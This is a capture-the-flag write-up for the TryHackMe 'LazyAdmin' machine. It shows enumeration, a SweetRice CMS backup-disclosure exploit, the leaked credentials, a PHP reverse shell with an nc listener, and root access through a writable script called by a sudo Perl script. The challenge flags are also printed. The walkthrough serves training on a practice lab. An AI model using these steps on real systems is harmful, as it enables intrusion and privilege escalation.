## 📄 THM: [Machine Name: LazyAdmin]

Challenge Details

Category: [[CyberSecurity]], [[Web Exploitation]], [[CMS Vulnerability]], [[File Disclosure]], [[Insecure Permissions]], [[SUDO Abuse]]

Difficulty: Easy/Medium

Target: 10.49.159.114

Status: #solved

Date Completed: [[2025-11-24]]

---

## 🗺️ Phase 1: Reconnaissance and Initial Access

Initial scans revealed a basic web server and SSH, pointing towards the web application as the primary entry point.

### A. Nmap Scans (Full Log)

|**Scan Type**|**Command Used**|**Key Findings**|
|---|---|---|
|**Full Port Scan**|`nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt`|Ports **22 (ssh)** and **80 (http)** open.|
|**Service/Script Scan**|`nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt`|**SSH OpenSSH 7.2p2 (Ubuntu)** and **Apache httpd 2.4.18 (Ubuntu)**.|
|**Vulnerability Scan**|`nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt`|No immediate, simple vulnerabilities were found by the automated scripts.|

### B. Directory Enumeration and Web Application Discovery

The initial directory enumeration confirmed the existence of a web application under the `/content` directory.

Bash

```
gobuster dir -u http://$target -w /usr/share/wordlists/dirb/big.txt -t 50 -r
```

**Gobuster Output Snippet:**

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
**/content              (Status: 200) [Size: 2199]**
/server-status        (Status: 403) [Size: 278]
...
```

The application was identified as **SweetRice CMS**.

### C. Exploit Search and File Disclosure

Searching for SweetRice vulnerabilities led to the **Backup Disclosure** exploit.

```
SweetRice 1.5.1 - Backup Disclosure php/webapps/40718.txt looks interesting
```

The proof-of-concept indicated that the database backup directory was exposed.

Bash

```
gobuster dir -u http://$target/content -w /usr/share/wordlists/dirb/big.txt -t 50 -r
```

The directory structure confirmed the presence of `/inc` and other SweetRice components.

Following the vulnerability path, the database backup file was accessed and downloaded.

(Implied step: wget http://$target/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql)

**Downloaded mysql_bakup_20191129023059-1.5.1.sql content snippet:**

```
manager:42f749ade7f9e195bf475f37a44cafcb
**manager:Password123**
```

**Credentials Found:** **`manager:Password123`**

---

## 🔑 Phase 2: User Access (Web Shell) and User Flag

The discovered credentials worked on the application's login page, allowing access to the administrative dashboard.

### A. Web Application Access and RCE

```
Found a directory /content/inc/as that had a login. The creds work!
```

The credentials were used to log into the admin panel (likely `/content/inc/as/`). A PHP reverse shell was uploaded using a feature like the **Ads management** section (which uses the `/content/inc/ads` directory).

### B. Shell Access and User Flag

A Netcat listener was established, and the uploaded PHP shell was triggered.

Bash

```
# Attacker Listener
nc -nvlp 8009 
...
/bin/sh: 0: can't access tty; job control turned off
```

**User Flag Retrieval:**

Bash

```
www-data@THM-Chal:/home/itguy > cat user.txt 
**THM{63e5bce9271952aad1113b6f1ac28a07}**
```

---

## 👑 Phase 3: Privilege Escalation (SUDO Abuse)

The initial user **`www-data`** was not root, so local enumeration began, revealing a key Sudo misconfiguration.

### A. SUDO Check

Checking the **`sudo`** privileges showed that the **`www-data`** user could execute a specific Perl script without needing a password (**NOPASSWD**).

Bash

```
www-data@THM-Chal:/home/itguy > sudo -l
Matching Defaults entries for www-data on THM-Chal:
...

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

### B. Analyzing the Sudo Script

Inspecting the target script revealed that it executes an external, non-secure shell script.

Bash

```
www-data@THM-Chal:/home/itguy > cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

The Perl script simply calls the shell script `/etc/copy.sh`. Since `/etc/copy.sh` is called by a script runnable as **root** (via `sudo`), and assuming the user **`www-data`** has permissions to modify `/etc/copy.sh` (or if it's a file with weak permissions), the attacker can inject a payload here.

### C. Escalation and Root Flag

The `/etc/copy.sh` file was edited to contain a reverse shell payload, and the privileged Perl script was executed via **`sudo`**.

Bash

```
# Payload Injection (e.g., editing /etc/copy.sh)
I then edited /etc/copy.sh to have a reverse shell and got root!
```

_(Implied execution: `sudo /usr/bin/perl /home/itguy/backup.pl`)_

This triggered a new connection on the listener, now running as **`root`**.

**Root Shell and Flag:**

Bash

```
nc -nvlp 8009
listening on [any] 8009 ...
connect to [192.168.133.14] from (UNKNOWN) [10.49.159.114] 33866
/bin/sh: 0: can't access tty; job control turned off
# whoami
**root**
# cd /root
# ls
root.txt
# cat root.txt
**THM{6637f41d0177b6f37cb20d775124699f}**
```

The machine was compromised through: **SweetRice 1.5.1 File Disclosure** $\rightarrow$ **Credential Retrieval** $\rightarrow$ **RCE via Admin Panel** $\rightarrow$ **SUDO Misconfiguration Exploitation** $\rightarrow$ **Root**.
